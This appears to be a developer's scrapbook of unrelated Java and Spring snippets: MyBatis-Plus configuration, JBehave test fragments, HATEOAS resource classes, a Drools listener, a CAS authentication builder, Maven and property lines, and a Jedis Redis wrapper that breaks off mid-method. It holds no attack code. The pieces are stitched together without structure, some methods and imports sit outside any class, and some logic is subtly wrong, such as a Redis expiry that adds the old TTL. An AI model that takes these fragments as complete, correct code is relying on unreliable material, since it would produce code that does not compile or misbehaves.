import org.mybatis.spring.boot.autoconfigure.SpringBootVFS;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.context.annotation.*;
import org.springframework.core.io.DefaultResourceLoader;
import org.springframework.core.io.ResourceLoader;
import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.util.ObjectUtils;
import org.springframework.util.StringUtils;

import javax.annotation.Resource;
import javax.sql.DataSource;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
/**
 * 配置mybatis
 * @author yesh
 *         (M.M)!
 *         Created by 2017/6/16.
 */
@Slf4j
@Configuration
@EnableTransactionManagement //开启事务管理
@MapperScan(value = "com.mi.module.*.mapper")
@Import({ DataBaseConfiguration.class})
public class MybatisPlusConfig{

    @Value("${spring.datasource.type}")
    private Class<? extends DataSource> dataSourceType;

    @Value("${datasource.readSize}")
    private String dataSourceSize;

    @Resource(name = "masterDataSource")
    private DataSource dataSource;

//    @Resource(name = "readDataSources")
//    private List<DataSource> readDataSources;


    @Autowired
    private MybatisProperties properties;

    @Autowired
    private ResourceLoader resourceLoader = new DefaultResourceLoader();

    @Autowired(required = false)
    private Interceptor[] interceptors;

    @Autowired(required = false)
    private DatabaseIdProvider databaseIdProvider;

    /**
     *	 mybatis-plus分页插件
     */
    @Bean
    public PaginationInterceptor paginationInterceptor() {
        PaginationInterceptor page = new PaginationInterceptor();
        page.setDialectType("mysql");
        return page;
    }


    /**
     * 这里全部使用mybatis-autoconfigure 已经自动加载的资源。不手动指定
     * 配置文件和mybatis-boot的配置文件同步
     * @return
     */
    @Bean
    @ConditionalOnMissingBean
    public MybatisSqlSessionFactoryBean mybatisSqlSessionFactoryBean() {
        MybatisSqlSessionFactoryBean mybatisPlus = new MybatisSqlSessionFactoryBean();
        mybatisPlus.setDataSource(dataSource);
        mybatisPlus.setVfs(SpringBootVFS.class);
        if (StringUtils.hasText(this.properties.getConfigLocation())) {
            mybatisPlus.setConfigLocation(this.resourceLoader.getResource(this.properties.getConfigLocation()));
        }
        mybatisPlus.setConfiguration(properties.getConfiguration());
        if (!ObjectUtils.isEmpty(this.interceptors)) {
            mybatisPlus.setPlugins(this.interceptors);
        }
        // MP 全局配置，更多内容进入类看注释
        GlobalConfiguration globalConfig = new GlobalConfiguration();
        //驼峰下划线规则
        globalConfig.setDbColumnUnderline(true);
        globalConfig.setDbType(DBType.MYSQL.name());
        // ID 策略
        // AUTO->`0`("数据库ID自增")
        // INPUT->`1`(用户输入ID")
        // ID_WORKER->`2`("全局唯一ID")
        // UUID->`3`("全局唯一ID")
        globalConfig.setIdType(3);
        mybatisPlus.setGlobalConfig(globalConfig);
        MybatisConfiguration mc = new MybatisConfiguration();
        mc.setDefaultScriptingLanguage(MybatisXMLLanguageDriver.class);
        mybatisPlus.setConfiguration(mc);
        if (this.databaseIdProvider != null) {
            mybatisPlus.setDatabaseIdProvider(this.databaseIdProvider);
        }
        if (StringUtils.hasLength(this.properties.getTypeAliasesPackage())) {
            mybatisPlus.setTypeAliasesPackage(this.properties.getTypeAliasesPackage());
        }
        if (StringUtils.hasLength(this.properties.getTypeHandlersPackage())) {
            mybatisPlus.setTypeHandlersPackage(this.properties.getTypeHandlersPackage());
        }
        if (!ObjectUtils.isEmpty(this.properties.resolveMapperLocations())) {
            mybatisPlus.setMapperLocations(this.properties.resolveMapperLocations());
        }
        return mybatisPlus;
    }

    //旧方法使用基本的Mybatis
//    @Bean
//    @ConditionalOnMissingBean
//    public SqlSessionFactory sqlSessionFactory() throws Exception {
//        SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean();
//        sqlSessionFactoryBean.setDataSource(roundRobinDataSouceProxy());
//        PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver();
//        sqlSessionFactoryBean.setMapperLocations(resolver.getResources("classpath:mybatis/*.xml"));
//        sqlSessionFactoryBean.setTypeAliasesPackage("com.mi.model");
//        sqlSessionFactoryBean.getObject().getConfiguration().setMapUnderscoreToCamelCase(true);
//        return sqlSessionFactoryBean.getObject();
//    }

//    /**
//     * 有多少个数据源就要配置多少个bean
//     * @return
//     */
//    @Bean
//    public AbstractRoutingDataSource roundRobinDataSouceProxy() {
//
//        int size = Integer.parseInt(dataSourceSize);
//
//        MyAbstractRoutingDataSource proxy = new MyAbstractRoutingDataSource(size);
//
//        Map<Object, Object> targetDataSources = new HashMap<Object, Object>();
//
//        // DataSource writeDataSource = SpringContextHolder.getBean("writeDataSource");
//        //设置写库
//        targetDataSources.put(DataSourceType.write.getType(),dataSource);
//
//        // targetDataSources.put(DataSourceType.read.getType(),readDataSource);
//        //设置多读库
//        for (int i = 0; i < size; i++) {
//            targetDataSources.put(i, readDataSources.get(i));
//        }
//
//        proxy.setDefaultTargetDataSource(dataSource);
//        proxy.setTargetDataSources(targetDataSources);
//        return proxy;
//    }
}
----------------------------------------------------------------------------------------
public static final Format YOUR_CUSTOM_CONSOLE = new Format("YOUR_CUSTOM_CONSOLE")
{
@Override
public StoryReporter createStoryReporter(FilePrintStreamFactory factory,
StoryReporterBuilder storyReporterBuilder) {
return new TeamCityConsoleOutput(storyReporterBuilder.keywords()).doReportFailureTrace(
storyReporterBuilder.reportFailureTrace()).doCompressFailureTrace(
storyReporterBuilder.compressFailureTrace());
}
};

@RunWith(JUnitReportingRunner.class)
public abstract class AbstractIntegrationTestStory extends JUnitStory {

@BeforeStories
public void beforeStories() throws ExecutionException {
assertTrue(false);
}

...

@Override
public Configuration configuration() {
return JBehaveTestHelper.configuration(this.getClass(), xref);
}
}

	@Override
	protected List<String> storyPaths() {
		//String codeLocation = CodeLocations.codeLocationFromClass(this.getClass()).getFile();
		
		String storiesPath = null;
        
            try {
				storiesPath = new File(getClass().getClassLoader().getResource("stories").toURI()).getAbsolutePath();
			} catch (URISyntaxException e) {
				e.printStackTrace();
			}
               
        return new StoryFinder().findPaths(storiesPath, "**/*.story", "");
	}
	
	
	import com.github.kumaraman21.intellijbehave.parser.StoryElementType;
import org.jbehave.core.annotations.Given;
import org.jbehave.core.annotations.Then;
import org.jbehave.core.annotations.When;
import org.jbehave.core.steps.StepType;

import java.util.HashMap;
import java.util.Map;

public class StepTypeMappings {

  public static final Map<StepType, String> STEP_TYPE_TO_ANNOTATION_MAPPING = new HashMap<StepType, String>();
  static {
    STEP_TYPE_TO_ANNOTATION_MAPPING.put(StepType.GIVEN, Given.class.getName());
    STEP_TYPE_TO_ANNOTATION_MAPPING.put(StepType.WHEN, When.class.getName());
    STEP_TYPE_TO_ANNOTATION_MAPPING.put(StepType.THEN, Then.class.getName());
  }

  public static final Map<String, StepType> ANNOTATION_TO_STEP_TYPE_MAPPING = new HashMap<String, StepType>();
  static {
      ANNOTATION_TO_STEP_TYPE_MAPPING.put(Given.class.getName(), StepType.GIVEN);
      ANNOTATION_TO_STEP_TYPE_MAPPING.put(When.class.getName(), StepType.WHEN);
      ANNOTATION_TO_STEP_TYPE_MAPPING.put(Then.class.getName(), StepType.THEN);
    }

  public static final Map<StoryElementType, StepType> STORY_ELEMENT_TYPE_TO_STEP_TYPE_MAPPING = new HashMap<StoryElementType, StepType>();
  static {
    STORY_ELEMENT_TYPE_TO_STEP_TYPE_MAPPING.put(StoryElementType.GIVEN_STEP, StepType.GIVEN);
    STORY_ELEMENT_TYPE_TO_STEP_TYPE_MAPPING.put(StoryElementType.WHEN_STEP, StepType.WHEN);
    STORY_ELEMENT_TYPE_TO_STEP_TYPE_MAPPING.put(StoryElementType.THEN_STEP, StepType.THEN);
  }

  public static final Map<String, StoryElementType> STEP_TEXT_TO_STORY_ELEMENT_TYPE_MAPPING = new HashMap<String, StoryElementType>();
  static {
    STEP_TEXT_TO_STORY_ELEMENT_TYPE_MAPPING.put(StepType.GIVEN.name(), StoryElementType.GIVEN_STEP );
    STEP_TEXT_TO_STORY_ELEMENT_TYPE_MAPPING.put(StepType.WHEN.name(), StoryElementType.WHEN_STEP);
    STEP_TEXT_TO_STORY_ELEMENT_TYPE_MAPPING.put(StepType.THEN.name(), StoryElementType.THEN_STEP);
  }
}

public class CustomWebMvcTagsProvider extends DefaultWebMvcTagsProvider {

public Iterable<Tag> getTags(HttpServletRequest request, HttpServletResponse response, Object handler, Throwable exception) {
return Tags.of(super.getTags(request, response, handler, exception)).and(getTenantTag(request));
}

private Tag getTenantTag(HttpServletRequest request) {
String tenant = ((Map<String, String>)request.getAttribute(HandlerMapping.URI_TEMPLATE_VARIABLES_ATTRIBUTE)).get("tenant");
if(tenant == null){
tenant = "na";
}
return Tag.of("tenant", tenant);
}


spring.batch.job.enabled=false
----------------------------------------------------------------------------------------
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.linkTo;
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.methodOn;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.hateoas.mvc.ResourceAssemblerSupport;
import org.springframework.stereotype.Component;

import com.sctrcd.qzr.facts.Answer;
import com.sctrcd.qzr.web.controllers.HrMaxQuizController;

/**
 * Injected into the {@link HrMaxQuizController} as a tool for building {@link AnswerResource}.
 * 
 * @author Stephen Masters
 */
@Component
public class AnswerResourceAssembler extends ResourceAssemblerSupport<Answer, AnswerResource> {

    @Autowired
    private QuestionResourceAssembler questionResourceAssembler;
    
    public AnswerResourceAssembler() {
        super(HrMaxQuizController.class, AnswerResource.class);
    }

    @Override
    public AnswerResource toResource(Answer answer) {

        AnswerResource resource = createResourceWithId("questions/" + answer.getKey() + "/answer", answer);

        resource.setKey(answer.getKey());
        if (answer.getValue() != null) { 
            resource.setValue(answer.getValue().toString());
        }
        resource.setWhen(answer.getWhen());

        if (answer.getQuestion() != null) {
            try {
                resource.add(linkTo(methodOn(HrMaxQuizController.class)
                        .getQuestion(answer.getKey()))
                        .withRel("question"));
            } catch (NotFoundException e) {
                // Do nothing ... the exception cannot be thrown.
            }
        }

        return resource;
    }

}

import javax.xml.bind.annotation.XmlRootElement;

import org.joda.time.DateTime;
import org.springframework.hateoas.ResourceSupport;

import com.fasterxml.jackson.databind.annotation.JsonSerialize;
import com.sctrcd.qzr.web.json.JsonJodaDateTimeSerializer;

@XmlRootElement(name = "answer")
public class AnswerResource extends ResourceSupport {

    private String key;
    private String value;
    private DateTime when;

    public AnswerResource() {
    }

    public AnswerResource(String key, String value) {
        this.key = key;
        this.value = value;
    }
    
    public String getKey() {
        return key;
    }

    public void setKey(String key) {
        this.key = key;
    }

    public String getValue() {
        return value;
    }

    public void setValue(String value) {
        this.value = value;
    }

    @JsonSerialize(using = JsonJodaDateTimeSerializer.class)
    public DateTime getWhen() {
        return when;
    }

    public void setWhen(DateTime when) {
        this.when = when;
    }

    public String toString() {
        return this.getClass().getSimpleName() 
                + ": { key=\"" + key + "\", value=\"" + value + "\" }";
    }
}

java -jar target/qzr-web-1.0.0-SNAPSHOT.jar --spring.profiles.active=scratch,drools


import org.kie.api.event.rule.ObjectInsertedEvent;
import org.kie.api.event.rule.ObjectDeletedEvent;
import org.kie.api.event.rule.ObjectUpdatedEvent;
import org.drools.core.event.DefaultRuleRuntimeEventListener;
import org.kie.api.runtime.rule.FactHandle;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.sctrcd.drools.DroolsUtil;

/**
 * When validation rules fire, they should insert a TradeValidationAnnotation
 * into the working memory. This class listens for these events, and adds them
 * to a list so that a client can query all the alerts raised for a request.
 * <p>
 * You should probably avoid using this outside testing, as the contained lists
 * of events will grow and grow.
 * </p>
 * 
 * @author Stephen Masters
 */
public class LoggingRuleRuntimeEventListener
            extends DefaultRuleRuntimeEventListener {

    private static Logger log = LoggerFactory.getLogger(LoggingRuleRuntimeEventListener.class);

    private FactHandle handleFilter;
    private Class<?> classFilter;

    /**
     * Void constructor sets the listener to record all working memory events
     * with no filtering.
     */
    public LoggingRuleRuntimeEventListener() {
        this.handleFilter = null;
    }
    
    /**
     * Constructor which sets up an event filter. The listener will only record
     * events when the event {@link FactHandle} matches the constructor argument.
     * 
     * @param handle
     *            The {@link FactHandle} to filter on.
     */
    public LoggingRuleRuntimeEventListener(FactHandle handle) {
        this.handleFilter = handle;
    }
    
    public LoggingRuleRuntimeEventListener(Class<?> classFilter) {
        this.handleFilter = null;
        this.classFilter = classFilter;
    }

    @Override
    public void objectInserted(final ObjectInsertedEvent event) {
        if ((handleFilter == null  && classFilter == null)
                || event.getFactHandle() == handleFilter
                || event.getObject().getClass().equals(classFilter)) {
            log.trace("Insertion: " + DroolsUtil.objectDetails(event.getObject()));
        }
    }

    @Override
    public void objectDeleted(final ObjectDeletedEvent event) {
        if ((handleFilter == null  && classFilter == null) 
                || event.getFactHandle() == handleFilter
                || event.getOldObject().getClass().equals(classFilter)) {
            log.trace("Retraction: " + DroolsUtil.objectDetails(event.getOldObject()));
        }
    }

    @Override
    public void objectUpdated(final ObjectUpdatedEvent event) {
        if ((handleFilter == null  && classFilter == null) 
                || event.getFactHandle() == handleFilter
                || event.getObject().getClass().equals(classFilter)) {

            log.trace("Update: " + DroolsUtil.objectDetails(event.getObject()));
        }
    }

    @Override
    public String toString() {
        return LoggingRuleRuntimeEventListener.class.getSimpleName();
    }
}



import io.fabric8.kubernetes.client.KubernetesClient;
import org.jboss.arquillian.junit.Arquillian;
import org.jboss.arquillian.test.api.ArquillianResource;
import org.junit.Test;
import org.junit.runner.RunWith;

import static io.fabric8.kubernetes.assertions.Assertions.assertThat;

@RunWith(Arquillian.class)
public class KubernetesIntegrationKT {

    @ArquillianResource
    KubernetesClient client;

    @Test
    public void testAppProvisionsRunningPods() throws Exception {
        assertThat(client).deployments().pods().isPodReadyForPeriod();
    }
}


      <plugin>
                        <groupId>org.sonatype.plugins</groupId>
                        <artifactId>nexus-staging-maven-plugin</artifactId>
                        <version>${nexus-staging-maven-plugin.version}</version>
                        <extensions>true</extensions>
                        <configuration>
                            <serverId>oss.sonatype.org</serverId>
                            <nexusUrl>https://oss.sonatype.org/</nexusUrl>
                            <autoReleaseAfterClose>true</autoReleaseAfterClose>
                        </configuration>
                    </plugin>
					
   <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-cas</artifactId>
        </dependency>
		
		https://www.programcreek.com/java-api-examples/index.php?project_name=kakawait%2Fcas-security-spring-boot-starter#
		
		
		import com.kakawait.spring.security.cas.authentication.DynamicProxyCallbackUrlCasAuthenticationProvider;
import lombok.Setter;
import lombok.experimental.Accessors;
import org.jasig.cas.client.validation.TicketValidator;
import org.springframework.context.MessageSource;
import org.springframework.security.cas.authentication.CasAssertionAuthenticationToken;
import org.springframework.security.cas.authentication.CasAuthenticationProvider;
import org.springframework.security.cas.authentication.StatelessTicketCache;
import org.springframework.security.config.annotation.SecurityBuilder;
import org.springframework.security.core.authority.mapping.GrantedAuthoritiesMapper;
import org.springframework.security.core.userdetails.AuthenticationUserDetailsService;

/**
 * @author Thibaud Leprêtre
 */
@Accessors(fluent = true)
@Setter
public class CasAuthenticationProviderSecurityBuilder implements SecurityBuilder<CasAuthenticationProvider> {

    private CasSecurityProperties.ServiceResolutionMode serviceResolutionMode;

    private AuthenticationUserDetailsService<CasAssertionAuthenticationToken> authenticationUserDetailsService;

    private GrantedAuthoritiesMapper grantedAuthoritiesMapper;

    private MessageSource messageSource;

    private StatelessTicketCache statelessTicketCache;

    private TicketValidator ticketValidator;

    private String key;

    @Override
    public CasAuthenticationProvider build() throws Exception {
        CasAuthenticationProvider provider;
        switch (serviceResolutionMode) {
            case DYNAMIC:
                provider = new DynamicProxyCallbackUrlCasAuthenticationProvider();
                break;
            default:
                provider = new CasAuthenticationProvider();
                break;
        }
        provider.setAuthenticationUserDetailsService(authenticationUserDetailsService);
        provider.setKey(key);
        provider.setTicketValidator(ticketValidator);
        if (messageSource != null) {
            provider.setMessageSource(messageSource);
        }
        if (statelessTicketCache != null) {
            provider.setStatelessTicketCache(statelessTicketCache);
        }
        if (grantedAuthoritiesMapper != null) {
            provider.setAuthoritiesMapper(grantedAuthoritiesMapper);
        }
        return provider;
    }
}



import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

/**
 * Converts between AccountType enum to databse persistence value.
 * 
 * @author David Ferreira Pinto
 *
 */
@Converter
public class AccountTypeConverter implements
		AttributeConverter<AccountType, String> {

	@Override
	public String convertToDatabaseColumn(AccountType type) {
		switch (type) {
		case CURRENT:
			return "C";
		case SAVINGS:
			return "S";
		default:
			throw new IllegalArgumentException("Unknown" + type);
		}
	}

	@Override
	public AccountType convertToEntityAttribute(String dbData) {
		switch (dbData) {
		case "C":
			return AccountType.CURRENT;
		case "S":
			return AccountType.SAVINGS;
		default:
			throw new IllegalArgumentException("Unknown" + dbData);
		}
	}

}

https://www.programcreek.com/java-api-examples/index.php?project_name=gratiartis%2Fqzr#
----------------------------------------------------------------------------------------
mvn dependency:purge-local-repository

<dependency>
<groupId>org.springframework.security</groupId>
<artifactId>spring-security-oauth2-client</artifactId>
</dependency>
<dependency>
<groupId>org.springframework.security</groupId>
<artifactId>spring-security-oauth2-jose</artifactId>
</dependency>

eureka.client.service-url.defaultZone=http://localhost:${server.port}/eureka/
----------------------------------------------------------------------------------------
  @Test
  public void testBarCreation() {
    EnvironmentTestUtils.addEnvironment(context, "bar.name=test");
    context.register(BarConfiguration.class, PropertyPlaceholderAutoConfiguration.class);
    context.refresh();
    assertEquals(context.getBean(Bar.class).getName(), "test");
  }
----------------------------------------------------------------------------------------
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import com.ace.cache.service.IRedisService;
import org.apache.log4j.Logger;
import org.joda.time.DateTime;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.BinaryClient.LIST_POSITION;

@Service
public class RedisServiceImpl implements IRedisService {
    private static final Logger LOGGER = Logger.getLogger(RedisServiceImpl.class);

    @Autowired
    private JedisPool pool;

    @Override
    public String get(String key) {
        Jedis jedis = null;
        String value = null;
        try {
            jedis = pool.getResource();
            value = jedis.get(key);
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return value;
    }

    @Override
    public Set<String> getByPre(String pre) {
        Jedis jedis = null;
        Set<String> value = null;
        try {
            jedis = pool.getResource();
            value = jedis.keys(pre + "*");
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return value;
    }

    @Override
    public String set(String key, String value) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            return jedis.set(key, value);
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
            return "0";
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public String set(String key, String value, int expire) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            int time = jedis.ttl(key).intValue() + expire;
            String result = jedis.set(key, value);
            jedis.expire(key, time);
            return result;
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
            return "0";
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public Long delPre(String key) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            Set<String> set = jedis.keys(key + "*");
            int result = set.size();
            Iterator<String> it = set.iterator();
            while (it.hasNext()) {
                String keyStr = it.next();
                jedis.del(keyStr);
            }
            return new Long(result);
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
            return 0L;
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public Long del(String... keys) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            return jedis.del(keys);
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
            return 0L;
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public Long append(String key, String str) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.append(key, str);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
            return 0L;
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Boolean exists(String key) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            return jedis.exists(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
            return false;
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public Long setnx(String key, String value) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            return jedis.setnx(key, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
            return 0L;
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public String setex(String key, String value, int seconds) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.setex(key, seconds, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long setrange(String key, String str, int offset) {
        Jedis jedis = null;
        try {
            jedis = pool.getResource();
            return jedis.setrange(key, offset, str);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
            return 0L;
        } finally {
            returnResource(pool, jedis);
        }
    }

    @Override
    public List<String> mget(String... keys) {
        Jedis jedis = null;
        List<String> values = null;
        try {
            jedis = pool.getResource();
            values = jedis.mget(keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return values;
    }

    @Override
    public String mset(String... keysvalues) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.mset(keysvalues);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long msetnx(String... keysvalues) {
        Jedis jedis = null;
        Long res = 0L;
        try {
            jedis = pool.getResource();
            res = jedis.msetnx(keysvalues);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public String getset(String key, String value) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.getSet(key, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public String getrange(String key, int startOffset, int endOffset) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.getrange(key, startOffset, endOffset);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long incr(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.incr(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long incrBy(String key, Long integer) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.incrBy(key, integer);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long decr(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.decr(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long decrBy(String key, Long integer) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.decrBy(key, integer);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long serlen(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.strlen(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long hset(String key, String field, String value) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hset(key, field, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long hsetnx(String key, String field, String value) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hsetnx(key, field, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String hmset(String key, Map<String, String> hash) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hmset(key, hash);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String hget(String key, String field) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hget(key, field);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public List<String> hmget(String key, String... fields) {
        Jedis jedis = null;
        List<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hmget(key, fields);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long hincrby(String key, String field, Long value) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hincrBy(key, field, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Boolean hexists(String key, String field) {
        Jedis jedis = null;
        Boolean res = false;
        try {
            jedis = pool.getResource();
            res = jedis.hexists(key, field);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long hlen(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hlen(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;

    }


    @Override
    public Long hdel(String key, String... fields) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hdel(key, fields);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> hkeys(String key) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hkeys(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public List<String> hvals(String key) {
        Jedis jedis = null;
        List<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hvals(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Map<String, String> hgetall(String key) {
        Jedis jedis = null;
        Map<String, String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.hgetAll(key);
        } catch (Exception e) {
            // TODO
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long lpush(String key, String... strs) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lpush(key, strs);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long rpush(String key, String... strs) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.rpush(key, strs);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long linsert(String key, LIST_POSITION where, String pivot, String value) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.linsert(key, where, pivot, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String lset(String key, Long index, String value) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lset(key, index, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long lrem(String key, long count, String value) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lrem(key, count, value);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String ltrim(String key, long start, long end) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.ltrim(key, start, end);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    synchronized public String lpop(String key) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lpop(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    synchronized public String rpop(String key) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.rpop(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String rpoplpush(String srckey, String dstkey) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.rpoplpush(srckey, dstkey);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String lindex(String key, long index) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lindex(key, index);
